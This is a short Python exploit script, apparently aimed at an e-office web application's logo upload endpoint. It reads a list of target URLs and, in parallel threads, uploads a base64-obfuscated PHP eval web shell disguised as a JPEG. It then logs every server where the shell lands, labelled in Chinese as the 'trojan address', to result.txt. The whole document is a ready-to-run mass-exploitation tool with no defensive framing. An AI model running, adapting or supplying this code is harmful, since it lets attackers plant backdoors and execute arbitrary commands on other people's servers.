import requests
import threading
import sys
import random
from queue import Queue
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning
threads=[]
print("\033[1;35m-----------------------------------------------------------------------------by J0J0----------------------------------------------------------------------------------\n\033[0m")
file_name=input("enter url_filename>>>")
f=open(file_name,"r")
f1=open("result.txt","w")
def POC(target_url,result_q):
    vuln_url = target_url + "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryVB9nc4BgAcsa6lq4",
        "Cookie": "PHPSESSID=j0j0"
    }
    data = base64.b64decode("LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5VkI5bmM0QmdBY3NhNmxxNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkZpbGVkYXRhIjsgZmlsZW5hbWU9ImowajAucGhwIgpDb250ZW50LVR5cGU6IGltYWdlL2pwZWcKCjw/cGhwIEBldmFsKCRfUkVRVUVTVFtBXSk7Pz4KCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeVZCOW5jNEJnQWNzYTZscTQtLQ==")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data,verify=False, timeout=5)
        if response.status_code == 200 and 'logo-eoffice.php' in response.text:
            print("木马地址:{}/images/logo/logo-eoffice.php".format(target_url))
            result=target_url+"/images/logo/logo-eoffice.php"
            f1.write(result+"\n")
        else:
            print(target_url+"不存在漏洞")
    except Exception as e:
        print(e)
for targets in f.readlines():
    targets=targets.strip()
    t=threading.Thread(target=POC,args=(targets,Queue()))
    t.start()
    threads.append(t)
for i in threads:
    i.join()
f.close()
f1.close()
